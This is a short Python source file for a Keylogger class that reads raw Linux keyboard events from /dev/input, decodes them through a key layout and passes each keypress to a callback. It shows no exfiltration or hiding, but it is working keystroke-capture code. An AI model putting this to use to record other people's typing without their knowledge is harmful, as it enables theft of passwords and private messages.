#!/usr/bin/python
import struct
import config


class Keylogger:
    def __init__(self, event, layout=None, log_file="history"):
        self.event = event
        self.layout = layout
        self.input_file = None

        """
        FORMAT represents the format used by linux kernel input event struct see:
        https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28
        Stands for: long int, long int, unsigned short, unsigned short, unsigned int
        """
        self.FORMAT = 'llHHI'
        self.previous = 1

    def read_event(self):
        data = self.input_file.read(struct.calcsize(self.FORMAT))
        seconds, microseconds, type, code, value = struct.unpack(self.FORMAT, data)
        return seconds + microseconds / 1e6, type, code, value

    def start(self, callback):
        with open("/dev/input/" + self.event, "rb") as self.input_file:
            while config.running:
                seconds, type, code, value = self.read_event()
                if value != 1:
                    continue

                # If key has been held down
                if code == 0:
                    code = self.previous
                else:
                    self.previous = code

                try:
                    key = self.layout[code]
                except:
                    key = "Unknown"

                callback(key, code, seconds)

            self.input_file.close()
